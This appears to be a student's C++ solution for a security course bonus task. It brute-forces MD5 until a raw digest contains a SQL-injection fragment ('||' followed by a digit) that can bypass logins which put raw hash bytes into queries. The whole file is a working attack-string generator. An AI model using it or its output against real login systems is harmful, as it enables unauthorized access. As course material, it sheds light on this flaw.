/*
Steve Jarvis, CS 558. Licensed with MIT License.
Bonus SQL injection.

Running 16 instances concurrently, found a working attack string in 10 minutes.

Compiled like:
g++ inject.cpp -lssl -lcrypto -O3 -o inject
*/

#include <sstream>
#include <string>
#include <iostream>
#include <stdio.h>
#include <openssl/md5.h>
#include <ctime>
#include <cstdlib>

std::string getRandomString() {
    int SIZE = 32; // hex string 2 chars per byte
    std::srand(std::time(0));
    char blah[] = "0987654321qwertyuiopzxcvbnmlhgfdsazxcvbnm";
    std::stringstream ss;
    for( int i=0; i<SIZE; i++ ) {
       ss << blah[ std::rand() % (SIZE - 1) ];
    }
    return ss.str();
}

int main() {
    int SIZE = 16;
    unsigned char * hsh = new unsigned char[ SIZE ];

    unsigned char * dahash = new unsigned char[ SIZE ];
    long count = 1;
    std::stringstream ss;
    ss.str( getRandomString() );

    // '||'1
    while( true ) {
        hsh = MD5( (const unsigned char *)ss.str().c_str(), SIZE*2, dahash );

        checkStart:
        if( *hsh == '\'' ) {
            hsh ++;
            checkOr:
            if( *hsh == '|' ) {
                hsh ++;
                if( *hsh == '|' ) {
                    hsh ++;
                    checkOpenQuote:
                    if( *hsh == '\'' ) {
                        hsh++;
                        if( *hsh > 48 && *hsh < 58 ) {
                            // nailed it.
                            printf( "winner! count: %ld ", count );
                            std::cout << " val: " << ss.str();
                            printf( " outputs: " );
                            for( int i=0; i<SIZE; i++ ) {
                                printf( "%c", dahash[ i ] );
                            }
                            printf( "\n" );
                            break;
                        }
                    }
                    // missed quote
                    else if( *hsh == ' ' ) {
                        hsh ++;
                        goto checkOpenQuote;
                    }
                }
            }
            // missed or
            else if( *hsh == ' ' ) {
                hsh ++;
                goto checkOr;
            }
        }
        // didn't start yet
        else {
            if( hsh - dahash <= 2 ) {
                hsh ++;
                goto checkStart;
            }
        }
        // put the output in the input
        ss.clear();
        ss.str("");
        for( int i=0; i<SIZE; i++ ) {
            ss << std::hex << (int)dahash[ i ];
        }
        count ++;
    }

    return 0;
}
